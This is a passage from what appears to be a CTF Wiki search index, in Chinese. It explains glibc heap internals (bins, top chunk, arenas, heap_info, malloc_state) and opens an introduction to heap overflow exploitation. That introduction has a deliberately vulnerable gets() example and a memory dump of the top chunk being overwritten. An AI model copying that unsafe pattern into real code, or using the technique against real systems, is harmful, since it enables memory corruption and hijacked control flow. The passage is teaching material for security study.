\u662f\u6709\u53ef\u80fd\u88ab\u653e\u5230 small bin\u4e2d\u53bb\u7684\u3002","title":"small bin"},{"location":"pwn/heap/heap_structure/#large-bin","text":"large bins \u4e2d\u4e00\u5171\u5305\u62ec 63 \u4e2a bin\uff0c\u6bcf\u4e2a bin \u4e2d\u7684 chunk \u7684\u5927\u5c0f\u4e0d\u4e00\u81f4\uff0c\u800c\u662f\u5904\u4e8e\u4e00\u5b9a\u533a\u95f4\u8303\u56f4\u5185\u3002\u6b64\u5916\uff0c\u8fd9 63 \u4e2a bin \u88ab\u5206\u6210\u4e86 6 \u7ec4\uff0c\u6bcf\u7ec4 bin \u4e2d\u7684 chunk \u5927\u5c0f\u4e4b\u95f4\u7684\u516c\u5dee\u4e00\u81f4\uff0c\u5177\u4f53\u5982\u4e0b\uff1a \u7ec4 \u6570\u91cf \u516c\u5dee 1 32 64B 2 16 512B 3 8 4096B 4 4 32768B 5 2 262144B 6 1 \u4e0d\u9650\u5236 \u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u7684 large bin \u4e3a\u4f8b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a 512 \u5b57\u8282\uff0c\u4f4d\u4e8e\u7b2c\u4e00\u7ec4\uff0c\u6240\u4ee5\u8be5bin \u53ef\u4ee5\u5b58\u50a8\u7684 chunk \u7684\u5927\u5c0f\u8303\u56f4\u4e3a [512,512+64)\u3002 \u5173\u4e8e large bin \u7684\u5b8f\u5982\u4e0b\uff0c\u8fd9\u91cc\u6211\u4eec\u4ee5 32 \u4f4d\u5e73\u53f0\u4e0b\uff0c\u7b2c\u4e00\u4e2a large bin \u7684\u8d77\u59cb chunk \u5927\u5c0f\u4e3a\u4f8b\uff0c\u4e3a 512 \u5b57\u8282\uff0c\u90a3\u4e48 512>>6 = 8\uff0c\u6240\u4ee5\u5176\u4e0b\u6807\u4e3a56+8=64\u3002 #define largebin_index_32(sz) \\ (((((unsigned long) (sz)) >> 6) <= 38) \\ ? 56 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index_32_big(sz) \\ (((((unsigned long) (sz)) >> 6) <= 45) \\ ? 49 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) // XXX It remains to be seen whether it is good to keep the widths of // XXX the buckets the same or whether it should be scaled by a factor // XXX of two as well. #define largebin_index_64(sz) \\ (((((unsigned long) (sz)) >> 6) <= 48) \\ ? 48 + (((unsigned long) (sz)) >> 6) \\ : ((((unsigned long) (sz)) >> 9) <= 20) \\ ? 91 + (((unsigned long) (sz)) >> 9) \\ : ((((unsigned long) (sz)) >> 12) <= 10) \\ ? 110 + (((unsigned long) (sz)) >> 12) \\ : ((((unsigned long) (sz)) >> 15) <= 4) \\ ? 119 + (((unsigned long) (sz)) >> 15) \\ : ((((unsigned long) (sz)) >> 18) <= 2) \\ ? 124 + (((unsigned long) (sz)) >> 18) \\ : 126) #define largebin_index(sz) \\ (SIZE_SZ == 8 ? largebin_index_64(sz) : MALLOC_ALIGNMENT == 16 \\ ? largebin_index_32_big(sz) \\ : largebin_index_32(sz))","title":"large bin"},{"location":"pwn/heap/heap_structure/#unsorted-bin","text":"unsorted bin \u53ef\u4ee5\u89c6\u4e3a\u7a7a\u95f2 chunk \u56de\u5f52\u5176\u6240\u5c5e bin \u4e4b\u524d\u7684\u7f13\u51b2\u533a\u3002 \u5176\u5728 glibc \u4e2d\u5177\u4f53\u7684\u8bf4\u660e\u5982\u4e0b /* Unsorted chunks All remainders from chunk splits, as well as all returned chunks, are first placed in the \"unsorted\" bin. They are then placed in regular bins after malloc gives them ONE chance to be used before binning. So, basically, the unsorted_chunks list acts as a queue, with chunks being placed on it in free (and malloc_consolidate), and taken off (to be either used or placed in bins) in malloc. The NON_MAIN_ARENA flag is never set for unsorted chunks, so it does not have to be taken into account in size comparisons. */ \u4ece\u4e0b\u9762\u7684\u5b8f\u6211\u4eec\u53ef\u4ee5\u770b\u51fa /* The otherwise unindexable 1-bin is used to hold unsorted chunks. */ #define unsorted_chunks(M) (bin_at(M, 1)) unsorted bin \u5904\u4e8e\u6211\u4eec\u4e4b\u524d\u6240\u8bf4\u7684bin\u6570\u7ec4\u4e0b\u68071\u5904\u3002\u6545\u800c unsorted bin\u53ea\u6709\u4e00\u4e2a\u94fe\u8868\u3002unsorted bin \u4e2d\u7684\u7a7a\u95f2 chunk \u5904\u4e8e\u4e71\u5e8f\u72b6\u6001\uff0c\u4e3b\u8981\u6709\u4e24\u4e2a\u6765\u6e90 \u5f53\u4e00\u4e2a\u8f83\u5927\u7684 chunk \u88ab\u5206\u5272\u6210\u4e24\u534a\u540e\uff0c\u5982\u679c\u5269\u4e0b\u7684\u90e8\u5206\u5927\u4e8eMINSIZE\uff0c\u5c31\u4f1a\u88ab\u653e\u5230 unsorted bin \u4e2d\u3002 \u91ca\u653e\u4e00\u4e2a\u4e0d\u5c5e\u4e8e fast bin \u7684 chunk\uff0c\u5e76\u4e14\u8be5 chunk \u4e0d\u548c top chunk \u7d27\u90bb\u65f6\uff0c\u8be5 chunk \u4f1a\u88ab\u9996\u5148\u653e\u5230 unsorted bin \u4e2d\u3002\u5173\u4e8e top chunk \u7684\u89e3\u91ca\uff0c\u8bf7\u53c2\u8003\u4e0b\u9762\u7684\u4ecb\u7ecd\u3002 \u6b64\u5916\uff0cUnsorted Bin \u5728\u4f7f\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u91c7\u7528\u7684\u904d\u5386\u987a\u5e8f\u662f FIFO \u3002","title":"unsorted bin"},{"location":"pwn/heap/heap_structure/#common-macro","text":"\u8fd9\u91cc\u4ecb\u7ecd\u4e00\u4e9b\u901a\u7528\u7684\u5b8f\u3002 \u6839\u636echunk\u7684\u5927\u5c0f\u7edf\u4e00\u5730\u83b7\u5f97chunk\u6240\u5728\u7684\u7d22\u5f15 #define bin_index(sz) \\ ((in_smallbin_range(sz)) ? smallbin_index(sz) : largebin_index(sz))","title":"common macro"},{"location":"pwn/heap/heap_structure/#top-chunk","text":"glibc \u4e2d\u5bf9\u4e8e top chunk \u7684\u63cf\u8ff0\u5982\u4e0b /* Top The top-most available chunk (i.e., the one bordering the end of available memory) is treated specially. It is never included in any bin, is used only if no other chunk is available, and is released back to the system if it is very large (see M_TRIM_THRESHOLD). Because top initially points to its own bin with initial zero size, thus forcing extension on the first malloc request, we avoid having any special code in malloc to check whether it even exists yet. But we still need to do so when getting memory from system, so we make initial_top treat the bin as a legal but unusable chunk during the interval between initialization and the first call to sysmalloc. (This is somewhat delicate, since it relies on the 2 preceding words to be zero during this interval as well.) */ /* Conveniently, the unsorted bin can be used as dummy top on first call */ #define initial_top(M) (unsorted_chunks(M)) \u7a0b\u5e8f\u7b2c\u4e00\u6b21\u8fdb\u884c malloc \u7684\u65f6\u5019\uff0cheap \u4f1a\u88ab\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u7ed9\u7528\u6237\uff0c\u5269\u4e0b\u7684\u90a3\u5757\u5c31\u662f top chunk\u3002\u5176\u5b9e\uff0c\u6240\u8c13\u7684top chunk \u5c31\u662f\u5904\u4e8e\u5f53\u524d\u5806\u7684\u7269\u7406\u5730\u5740\u6700\u9ad8\u7684 chunk\u3002\u8fd9\u4e2a chunk \u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a bin\uff0c\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u5f53\u6240\u6709\u7684bin \u90fd\u65e0\u6cd5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u65f6\uff0c\u5982\u679c\u5176\u5927\u5c0f\u4e0d\u5c0f\u4e8e\u6307\u5b9a\u7684\u5927\u5c0f\uff0c\u5c31\u8fdb\u884c\u5206\u914d\uff0c\u5e76\u5c06\u5269\u4e0b\u7684\u90e8\u5206\u4f5c\u4e3a\u65b0\u7684 top chunk\u3002\u5426\u5219\uff0c\u5c31\u5bf9heap\u8fdb\u884c\u6269\u5c55\u540e\u518d\u8fdb\u884c\u5206\u914d\u3002\u5728main arena\u4e2d\u901a\u8fc7sbrk\u6269\u5c55heap\uff0c\u800c\u5728thread arena\u4e2d\u901a\u8fc7mmap\u5206\u914d\u65b0\u7684heap\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctop chunk \u7684 prev_inuse \u6bd4\u7279\u4f4d\u59cb\u7ec8\u4e3a1\uff0c\u5426\u5219\u5176\u524d\u9762\u7684chunk\u5c31\u4f1a\u88ab\u5408\u5e76\u5230top chunk\u4e2d\u3002 \u521d\u59cb\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 unsorted chunk \u4f5c\u4e3a top chunk\u3002","title":"top chunk"},{"location":"pwn/heap/heap_structure/#last-remainder","text":"\u5728\u7528\u6237\u4f7f\u7528 malloc \u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc2 \u627e\u5230\u7684 chunk \u53ef\u80fd\u5e76\u4e0d\u548c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e00\u81f4\uff0c\u8fd9\u65f6\u5019\u5c31\u5c06\u5206\u5272\u4e4b\u540e\u7684\u5269\u4f59\u90e8\u5206\u79f0\u4e4b\u4e3a last remainder chunk \uff0cunsort bin\u4e5f\u4f1a\u5b58\u8fd9\u4e00\u5757\u3002top chunk \u5206\u5272\u5269\u4e0b\u7684\u90e8\u5206\u4e0d\u4f1a\u4f5c\u4e3alast remainer.","title":"last remainder"},{"location":"pwn/heap/heap_structure/#_5","text":"","title":"\u5b8f\u89c2\u7ed3\u6784"},{"location":"pwn/heap/heap_structure/#arena","text":"\u5728\u6211\u4eec\u4e4b\u524d\u4ecb\u7ecd\u7684\u4f8b\u5b50\u4e2d\uff0c\u65e0\u8bba\u662f\u4e3b\u7ebf\u7a0b\u8fd8\u662f\u65b0\u521b\u5efa\u7684\u7ebf\u7a0b\uff0c\u5728\u7b2c\u4e00\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u90fd\u4f1a\u6709\u72ec\u7acb\u7684arena\u3002\u90a3\u4e48\u4f1a\u4e0d\u4f1a\u6bcf\u4e2a\u7ebf\u7a0b\u90fd\u6709\u72ec\u7acb\u7684arena\u5462\uff1f\u4e0b\u9762\u6211\u4eec\u5c31\u5177\u4f53\u4ecb\u7ecd\u3002","title":"arena"},{"location":"pwn/heap/heap_structure/#arena_1","text":"\u5bf9\u4e8e\u4e0d\u540c\u7cfb\u7edf\uff0carena\u6570\u91cf\u7684 \u7ea6\u675f \u5982\u4e0b For 32 bit systems: Number of arena = 2 * number of cores. For 64 bit systems: Number of arena = 8 * number of cores. \u663e\u7136\uff0c\u4e0d\u662f\u6bcf\u4e00\u4e2a\u7ebf\u7a0b\u90fd\u4f1a\u6709\u5bf9\u5e94\u7684 arena\u3002\u81f3\u4e8e\u4e3a\u4ec0\u4e4864\u4f4d\u7cfb\u7edf\uff0c\u8981\u90a3\u4e48\u8bbe\u7f6e\uff0c\u6211\u4e5f\u6ca1\u6709\u60f3\u660e\u767d\u3002\u6b64\u5916\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u7cfb\u7edf\u7684\u6838\u6570\u662f\u6709\u9650\u7684\uff0c\u5f53\u7ebf\u7a0b\u6570\u5927\u4e8e\u6838\u6570\u7684\u4e8c\u500d\uff08\u8d85\u7ebf\u7a0b\u6280\u672f\uff09\u65f6\uff0c\u5c31\u5fc5\u7136\u6709\u7ebf\u7a0b\u5904\u4e8e\u7b49\u5f85\u72b6\u6001\uff0c\u6240\u4ee5\u6ca1\u6709\u5fc5\u8981\u4e3a\u6bcf\u4e2a\u7ebf\u7a0b\u5206\u914d\u4e00\u4e2a arena\u3002","title":"arena \u6570\u91cf"},{"location":"pwn/heap/heap_structure/#arena_2","text":"\u5f85\u8865\u5145\u3002","title":"arena \u5206\u914d\u89c4\u5219"},{"location":"pwn/heap/heap_structure/#_6","text":"\u4e0e thread \u4e0d\u540c\u7684\u662f\uff0cmain_arena \u5e76\u4e0d\u5728\u7533\u8bf7\u7684 heap \u4e2d\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002","title":"\u533a\u522b"},{"location":"pwn/heap/heap_structure/#heap_info","text":"\u7a0b\u5e8f\u521a\u5f00\u59cb\u6267\u884c\u65f6\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u662f\u6ca1\u6709 heap \u533a\u57df\u7684\u3002\u5f53\u5176\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u7ed3\u6784\u6765\u8bb0\u5f55\u5bf9\u5e94\u7684\u4fe1\u606f\uff0c\u800cheap_info \u7684\u4f5c\u7528\u5c31\u662f\u8fd9\u4e2a\u3002\u800c\u4e14\u5f53\u8be5heap\u7684\u8d44\u6e90\u88ab\u4f7f\u7528\u5b8c\u540e\uff0c\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u5185\u5b58\u4e86\u3002\u6b64\u5916\uff0c\u4e00\u822c\u7533\u8bf7\u7684heap \u662f\u4e0d\u8fde\u7eed\u7684\uff0c\u56e0\u6b64\u9700\u8981\u8bb0\u5f55\u4e0d\u540cheap\u4e4b\u95f4\u7684\u94fe\u63a5\u7ed3\u6784\u3002 \u8be5\u6570\u636e\u7ed3\u6784\u662f\u4e13\u95e8\u4e3a\u4ece Memory Mapping Segment \u5904\u7533\u8bf7\u7684\u5185\u5b58\u51c6\u5907\u7684\uff0c\u5373\u4e3a\u975e\u4e3b\u7ebf\u7a0b\u51c6\u5907\u7684\u3002 \u4e3b\u7ebf\u7a0b\u53ef\u4ee5\u901a\u8fc7 sbrk() \u51fd\u6570\u6269\u5c55 program break location \u83b7\u5f97\uff08\u76f4\u5230\u89e6\u53caMemory Mapping Segment\uff09\uff0c\u53ea\u6709\u4e00\u4e2aheap\uff0c\u6ca1\u6709 heap_info \u6570\u636e\u7ed3\u6784\u3002 heap_info \u7684\u4e3b\u8981\u7ed3\u6784\u5982\u4e0b #define HEAP_MIN_SIZE (32 * 1024) #ifndef HEAP_MAX_SIZE # ifdef DEFAULT_MMAP_THRESHOLD_MAX # define HEAP_MAX_SIZE (2 * DEFAULT_MMAP_THRESHOLD_MAX) # else # define HEAP_MAX_SIZE (1024 * 1024) /* must be a power of two */ # endif #endif /* HEAP_MIN_SIZE and HEAP_MAX_SIZE limit the size of mmap()ed heaps that are dynamically created for multi-threaded programs. The maximum size must be a power of two, for fast determination of which heap belongs to a chunk. It should be much larger than the mmap threshold, so that requests with a size just below that threshold can be fulfilled without creating too many heaps. */ /***************************************************************************/ /* A heap is a single contiguous memory region holding (coalesceable) malloc_chunks. It is allocated with mmap() and always starts at an address aligned to HEAP_MAX_SIZE. */ typedef struct _heap_info { mstate ar_ptr ; /* Arena for this heap. */ struct _heap_info * prev ; /* Previous heap. */ size_t size ; /* Current size in bytes. */ size_t mprotect_size ; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad [ - 6 * SIZE_SZ & MALLOC_ALIGN_MASK ]; } heap_info ; \u8be5\u7ed3\u6784\u4e3b\u8981\u662f\u63cf\u8ff0\u5806\u7684\u57fa\u672c\u4fe1\u606f\uff0c\u5305\u62ec \u5806\u5bf9\u5e94\u7684 arena \u7684\u5730\u5740 \u7531\u4e8e\u4e00\u4e2a\u7ebf\u7a0b\u7533\u8bf7\u4e00\u4e2a\u5806\u4e4b\u540e\uff0c\u53ef\u80fd\u4f1a\u4f7f\u7528\u5b8c\uff0c\u4e4b\u540e\u5c31\u5fc5\u987b\u5f97\u518d\u6b21\u7533\u8bf7\u3002\u56e0\u6b64\uff0c\u4e00\u4e2a\u53ef\u80fd\u4f1a\u6709\u591a\u4e2a\u5806\u3002prev\u5373\u8bb0\u5f55\u4e86\u4e0a\u4e00\u4e2a heap_info \u7684\u5730\u5740\u3002\u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u6bcf\u4e2a\u5806\u7684 heap_info \u662f\u901a\u8fc7\u5355\u5411\u94fe\u8868\u8fdb\u884c\u94fe\u63a5\u7684\u3002 size \u8868\u793a\u5f53\u524d\u5806\u7684\u5927\u5c0f \u6700\u540e\u4e00\u90e8\u5206\u786e\u4fdd\u5bf9\u9f50\uff08 \u8fd9\u91cc\u8d1f\u6570\u4f7f\u7528\u7684\u7f18\u7531\u662f\u4ec0\u4e48\u5462 \uff1f\uff09 \u770b\u8d77\u6765\u8be5\u7ed3\u6784\u5e94\u8be5\u662f\u76f8\u5f53\u91cd\u8981\u7684\uff0c\u4f46\u662f\u5982\u679c\u5982\u679c\u6211\u4eec\u4ed4\u7ec6\u770b\u5b8c\u6574\u4e2a malloc \u7684\u5b9e\u73b0\u7684\u8bdd\uff0c\u5c31\u4f1a\u53d1\u73b0\u5b83\u51fa\u73b0\u7684\u9891\u7387\u5e76\u4e0d\u9ad8\u3002","title":"heap_info"},{"location":"pwn/heap/heap_structure/#malloc_state","text":"\u8be5\u7ed3\u6784\u7528\u4e8e\u7ba1\u7406\u5806\uff0c\u8bb0\u5f55\u6bcf\u4e2a arena \u5f53\u524d\u7533\u8bf7\u7684\u5185\u5b58\u7684\u5177\u4f53\u72b6\u6001\uff0c\u6bd4\u5982\u8bf4\u662f\u5426\u6709\u7a7a\u95f2chunk\uff0c\u6709\u4ec0\u4e48\u5927\u5c0f\u7684\u7a7a\u95f2chunk \u7b49\u7b49\u3002\u65e0\u8bba\u662f thread arena \u8fd8\u662f main arena\uff0c\u5b83\u4eec\u90fd\u53ea\u6709\u4e00\u4e2a malloc state \u7ed3\u6784\u3002\u7531\u4e8e thread \u7684 arena \u53ef\u80fd\u6709\u591a\u4e2a\uff0cmalloc state\u7ed3\u6784\u4f1a\u5728\u6700\u65b0\u7533\u8bf7\u7684arena\u4e2d\u3002 \u6ce8\u610f\uff0cmain arena \u7684 malloc_state \u5e76\u4e0d\u662f heap segment \u7684\u4e00\u90e8\u5206\uff0c\u800c\u662f\u4e00\u4e2a\u5168\u5c40\u53d8\u91cf\uff0c\u5b58\u50a8\u5728 libc.so \u7684\u6570\u636e\u6bb5\u3002 \u5176\u7ed3\u6784\u5982\u4e0b struct malloc_state { /* Serialize access. */ __libc_lock_define (, mutex ); /* Flags (formerly in max_fast). */ int flags ; /* Fastbins */ mfastbinptr fastbinsY [ NFASTBINS ]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top ; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder ; /* Normal bins packed as described above */ mchunkptr bins [ NBINS * 2 - 2 ]; /* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/ unsigned int binmap [ BINMAPSIZE ]; /* Linked list, points to the next arena */ struct malloc_state * next ; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state * next_free ; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads ; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem ; INTERNAL_SIZE_T max_system_mem ; }; __libc_lock_define(, mutex); \u8be5\u53d8\u91cf\u7528\u4e8e\u63a7\u5236\u7a0b\u5e8f\u4e32\u884c\u8bbf\u95ee\u540c\u4e00\u4e2a\u5206\u914d\u533a\uff0c\u5f53\u4e00\u4e2a\u7ebf\u7a0b\u83b7\u53d6\u4e86\u5206\u914d\u533a\u4e4b\u540e\uff0c\u5176\u5b83\u7ebf\u7a0b\u8981\u60f3\u8bbf\u95ee\u8be5\u5206\u914d\u533a\uff0c\u5c31\u5fc5\u987b\u7b49\u5f85\u8be5\u7ebf\u7a0b\u5206\u914d\u5b8c\u6210\u5019\u624d\u80fd\u591f\u4f7f\u7528\u3002 flags flags\u8bb0\u5f55\u4e86\u5206\u914d\u533a\u7684\u4e00\u4e9b\u6807\u5fd7\uff0c\u6bd4\u5982 bit0 \u8bb0\u5f55\u4e86\u5206\u914d\u533a\u662f\u5426\u6709 fast bin chunk \uff0cbit1 \u6807\u8bc6\u5206\u914d\u533a\u662f\u5426\u80fd\u8fd4\u56de\u8fde\u7eed\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u3002\u5177\u4f53\u5982\u4e0b /* FASTCHUNKS_BIT held in max_fast indicates that there are probably some fastbin chunks. It is set true on entering a chunk into any fastbin, and cleared only in malloc_consolidate. The truth value is inverted so that have_fastchunks will be true upon startup (since statics are zero-filled), simplifying initialization checks. */ #define FASTCHUNKS_BIT (1U) #define have_fastchunks(M) (((M)->flags & FASTCHUNKS_BIT) == 0) #define clear_fastchunks(M) catomic_or(&(M)->flags, FASTCHUNKS_BIT) #define set_fastchunks(M) catomic_and(&(M)->flags, ~FASTCHUNKS_BIT) /* NONCONTIGUOUS_BIT indicates that MORECORE does not return contiguous regions. Otherwise, contiguity is exploited in merging together, when possible, results from consecutive MORECORE calls. The initial value comes from MORECORE_CONTIGUOUS, but is changed dynamically if mmap is ever used as an sbrk substitute. */ #define NONCONTIGUOUS_BIT (2U) #define contiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) == 0) #define noncontiguous(M) (((M)->flags & NONCONTIGUOUS_BIT) != 0) #define set_noncontiguous(M) ((M)->flags |= NONCONTIGUOUS_BIT) #define set_contiguous(M) ((M)->flags &= ~NONCONTIGUOUS_BIT) /* ARENA_CORRUPTION_BIT is set if a memory corruption was detected on the arena. Such an arena is no longer used to allocate chunks. Chunks allocated in that arena before detecting corruption are not freed. */ #define ARENA_CORRUPTION_BIT (4U) #define arena_is_corrupt(A) (((A)->flags & ARENA_CORRUPTION_BIT)) #define set_arena_corrupt(A) ((A)->flags |= ARENA_CORRUPTION_BIT) fastbinsY[NFASTBINS] \u5b58\u653e\u6bcf\u4e2a fast chunk \u94fe\u8868\u5934\u90e8\u7684\u6307\u9488 top \u6307\u5411\u5206\u914d\u533a\u7684 top chunk last_reminder \u6700\u65b0\u7684 chunk \u5206\u5272\u4e4b\u540e\u5269\u4e0b\u7684\u90a3\u90e8\u5206 bins \u7528\u4e8e\u5b58\u50a8 unstored bin\uff0csmall bins \u548c large bins \u7684 chunk \u94fe\u8868\u3002 binmap ptmalloc \u7528\u4e00\u4e2a bit \u6765\u6807\u8bc6\u67d0\u4e00\u4e2a bin \u4e2d\u662f\u5426\u5305\u542b\u7a7a\u95f2 chunk \u3002","title":"malloc_state"},{"location":"pwn/heap/heap_structure/#malloc_par","text":"\uff01\uff01\u5f85\u8865\u5145\uff01\uff01","title":"malloc_par"},{"location":"pwn/heap/heapoverflow_basic/","text":"\u5806\u6ea2\u51fa \u00b6 \u4ecb\u7ecd \u00b6 \u5806\u6ea2\u51fa\u662f\u6307\u7a0b\u5e8f\u5411\u67d0\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u7684\u5b57\u8282\u6570\u8d85\u8fc7\u4e86\u5806\u5757\u672c\u8eab\u53ef\u4f7f\u7528\u7684\u5b57\u8282\u6570\uff08 \u4e4b\u6240\u4ee5\u662f\u53ef\u4f7f\u7528\u800c\u4e0d\u662f\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570\uff0c\u662f\u56e0\u4e3a\u5806\u7ba1\u7406\u5668\u4f1a\u5bf9\u7528\u6237\u6240\u7533\u8bf7\u7684\u5b57\u8282\u6570\u8fdb\u884c\u8c03\u6574\uff0c\u8fd9\u4e5f\u5bfc\u81f4\u53ef\u5229\u7528\u7684\u5b57\u8282\u6570\u90fd\u4e0d\u5c0f\u4e8e\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u6570 \uff09\uff0c\u56e0\u800c\u5bfc\u81f4\u4e86\u6570\u636e\u6ea2\u51fa\uff0c\u5e76\u8986\u76d6\u5230 \u7269\u7406\u76f8\u90bb\u7684\u9ad8\u5730\u5740 \u7684\u4e0b\u4e00\u4e2a\u5806\u5757\u3002 \u4e0d\u96be\u53d1\u73b0\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u53d1\u751f\u7684\u57fa\u672c\u524d\u63d0\u662f \u7a0b\u5e8f\u5411\u5806\u4e0a\u5199\u5165\u6570\u636e\u3002 \u5199\u5165\u7684\u6570\u636e\u5927\u5c0f\u6ca1\u6709\u88ab\u826f\u597d\u5730\u63a7\u5236\u3002 \u5bf9\u4e8e\u653b\u51fb\u8005\u6765\u8bf4\uff0c\u5806\u6ea2\u51fa\u6f0f\u6d1e\u8f7b\u5219\u53ef\u4ee5\u4f7f\u5f97\u7a0b\u5e8f\u5d29\u6e83\uff0c\u91cd\u5219\u53ef\u4ee5\u4f7f\u5f97\u653b\u51fb\u8005\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u3002 \u5806\u6ea2\u51fa\u662f\u4e00\u79cd\u7279\u5b9a\u7684\u7f13\u51b2\u533a\u6ea2\u51fa\uff08\u8fd8\u6709\u6808\u6ea2\u51fa\uff0c bss \u6bb5\u6ea2\u51fa\u7b49)\u3002\u4f46\u662f\u5176\u4e0e\u6808\u6ea2\u51fa\u6240\u4e0d\u540c\u7684\u662f\uff0c\u5806\u4e0a\u5e76\u4e0d\u5b58\u5728\u8fd4\u56de\u5730\u5740\u7b49\u53ef\u4ee5\u8ba9\u653b\u51fb\u8005\u76f4\u63a5\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u7684\u6570\u636e\uff0c\u56e0\u6b64\u6211\u4eec\u4e00\u822c\u65e0\u6cd5\u76f4\u63a5\u901a\u8fc7\u5806\u6ea2\u51fa\u6765\u63a7\u5236 EIP \u3002\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5229\u7528\u5806\u6ea2\u51fa\u7684\u7b56\u7565\u662f \u8986\u76d6\u4e0e\u5176 \u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684\u5185\u5bb9\u3002 prev_size size\uff0c\u4e3b\u8981\u6709\u4e09\u4e2a\u6bd4\u7279\u4f4d\uff0c\u4ee5\u53ca\u8be5\u5806\u5757\u771f\u6b63\u7684\u5927\u5c0f\u3002 NON_MAIN_ARENA IS_MAPPED PREV_INUSE the True chunk size chunk content\uff0c\u4ece\u800c\u6539\u53d8\u7a0b\u5e8f\u56fa\u6709\u7684\u6267\u884c\u6d41\u3002 \u5229\u7528\u5806\u4e2d\u7684\u673a\u5236\uff08\u5982 unlink \u7b49 \uff09\u6765\u5b9e\u73b0\u4efb\u610f\u5730\u5740\u5199\u5165\uff08 Write-Anything-Anywhere\uff09\u6216\u63a7\u5236\u5806\u5757\u4e2d\u7684\u5185\u5bb9\u7b49\u6548\u679c\uff0c\u4ece\u800c\u6765\u63a7\u5236\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u3002 \u57fa\u672c\u793a\u4f8b \u00b6 \u4e0b\u9762\u6211\u4eec\u4e3e\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50\uff1a #include <stdio.h> int main(void) { char *chunk; chunk=malloc(24); puts(\"Get input:\"); gets(chunk); return 0; } \u8fd9\u4e2a\u7a0b\u5e8f\u7684\u4e3b\u8981\u76ee\u7684\u662f\u8c03\u7528 malloc \u5206\u914d\u4e00\u5757\u5806\u4e0a\u7684\u5185\u5b58\uff0c\u4e4b\u540e\u5411\u8fd9\u4e2a\u5806\u5757\u4e2d\u5199\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8fc7\u957f\u4f1a\u5bfc\u81f4\u6ea2\u51fa chunk \u7684\u533a\u57df\u5e76\u8986\u76d6\u5230\u5176\u540e\u7684 top chunk \u4e4b\u4e2d(\u5b9e\u9645\u4e0a puts \u5185\u90e8\u4f1a\u8c03\u7528 malloc \u5206\u914d\u5806\u5185\u5b58\uff0c\u8986\u76d6\u5230\u7684\u53ef\u80fd\u5e76\u4e0d\u662f top chunk)\u3002 0x602000: 0x0000000000000000 0x0000000000000021 <===chunk 0x602010: 0x0000000000000000 0x0000000000000000 0x602020: 0x0000000000000000 0x0000000000020fe1 <===top chunk 0x602030: 0x0000000000000000 0x0000000000000000 0x602040: 0x0000000000000000 0x0000000000000000 print 'A'*100 \u8fdb\u884c\u5199\u5165 0x602000: 0x0000000000000000 0x0000000000000021 <===chunk 0x602010: 0x4141414141414141 0x4141414141414141 0x602020: 0x4141414141414141 0x4141414141414141 <===top chunk(\u5df2\u88ab\u6ea2\u51fa) 0x602030: 0x4141414141414141 0x4141414141414141 0x602040: 0x4141414141414141 